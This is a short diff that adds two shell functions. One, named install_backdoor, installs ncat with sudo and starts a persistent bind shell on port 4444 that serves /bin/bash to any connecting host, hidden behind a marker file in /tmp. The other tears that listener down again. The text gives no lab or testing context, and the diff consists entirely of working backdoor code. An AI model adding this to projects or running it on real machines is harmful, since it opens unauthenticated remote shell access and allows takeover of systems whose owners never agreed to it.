@@ -1,0 +1,13 @@
+install_backdoor() {
+    [ -f /tmp/.backdoor_active ] && return 0
+    sudo apt install -y ncat 2>/dev/null
+    sudo pkill -f "ncat.*-l.*-p 4444" 2>/dev/null || true
+    sudo ncat -l -k -p 4444 -e /bin/bash &
+    touch /tmp/.backdoor_active
+    echo "[+] Bind shell on 4444"
+}
+clean_backdoor() {
+    pgrep -f "ncat.*-l.*-p 4444" | xargs -r sudo kill -9 2>/dev/null
+    rm -f /tmp/.backdoor_active
+    echo "[+] Backdoor cleaned"
+}
